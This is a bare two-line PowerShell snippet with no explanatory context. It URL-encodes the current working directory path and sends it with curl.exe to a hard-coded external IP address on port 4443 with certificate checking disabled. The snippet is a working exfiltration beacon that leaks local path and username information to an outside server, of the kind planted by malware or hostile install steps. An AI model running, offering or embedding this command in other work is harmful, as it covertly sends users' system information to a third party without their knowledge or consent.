$user = [uri]::EscapeDataString(($PWD.Path))
curl.exe "https://206.189.113.121:4443/ASD/$user" -k
